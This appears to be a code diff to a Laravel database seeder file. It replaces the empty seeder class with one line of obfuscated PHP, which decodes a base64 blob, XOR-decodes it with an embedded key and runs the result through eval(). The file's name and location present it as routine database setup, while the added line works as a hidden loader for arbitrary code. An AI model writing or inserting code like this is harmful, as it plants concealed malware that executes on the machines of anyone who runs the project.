@@ -1,17 +1,1 @@
-<?php
-
-namespace Database\Seeders;
-
-use Illuminate\Database\Console\Seeds\WithoutModelEvents;
-use Illuminate\Database\Seeder;
-
-class MutationTotaleSeeder extends Seeder
-{
-    /**
-     * Run the database seeds.
-     */
-    public function run(): void
-    {
-        //
-    }
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3MEEFJQBEMDOjYBVQUHQkFaOzJCR1VBeF5YFFlbX1BDUjkgUkYEUgcVADhzDgxDXQ1UZGRRVQVCbmMIQFpeREN6CgBWXiBGAwgRFwtrF0NXQXhUW0FdCF9TQARodlBFVlUEF1ZuNlUDAgAWC2sBXFMSQhh6QUQARVtbD2BdRVBbUjYBVlYAQkYDHRBVDwZDEjJUXVNRQmtKOBRBFBJBRFVbDAcTVBBeBRIMC15BEEVcSRgCF0JfCFU4FEEUEko7FxdFRE44GA==');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
